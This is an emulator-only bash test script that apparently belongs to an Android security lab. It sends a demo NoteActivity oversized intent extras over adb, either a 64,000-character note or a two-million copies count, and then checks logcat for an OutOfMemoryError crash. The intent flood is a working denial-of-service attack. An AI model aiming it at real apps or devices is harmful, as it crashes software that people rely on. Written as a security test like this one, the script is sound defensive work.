#!/usr/bin/env bash
# Threat 2 (SPEC section 2): oversized extras (denial of service). EMULATOR ONLY. adb alone.
#   t2d_oversized_extra.sh          a 64 000-character note, copies=20000 (step 11)
#   t2d_oversized_extra.sh copies   a short note (1000 characters) with copies=2000000 (step 12): every
#                                   extra is small, only the int value is huge (docs/LIMITATIONS.md L38)
cd "$(dirname "$0")" && . ./_common.sh
echo "== t2d: oversized extras (threat 2) =="
require_emulator; require_victim
TIMEOUT=15
reset_state
MODE="${1:-large}"
if [ "$MODE" = "copies" ]; then NOTE_LEN=1000; COPIES=2000000; else NOTE_LEN=64000; COPIES=20000; fi
echo "MODE: $MODE"
NOTE=$(head -c "$NOTE_LEN" /dev/zero | tr '\0' 'A')
echo "ATTACK: NoteActivity with a $NOTE_LEN-character note and copies=$COPIES (the app builds $((NOTE_LEN * COPIES)) characters)."
echo "SEND: am start -n $VICTIM/.demo.NoteActivity --es note <$NOTE_LEN x 'A'> --ei copies $COPIES"
adb_sh "am start -n $VICTIM/.demo.NoteActivity --es note $NOTE --ei copies $COPIES" | sed 's/^/  am: /'
echo "LOOK FOR: a crash of $VICTIM in 'logcat -b crash' (OutOfMemoryError). There is no canary string."
verdict "" "$VICTIM/\.demo\.NoteActivity"
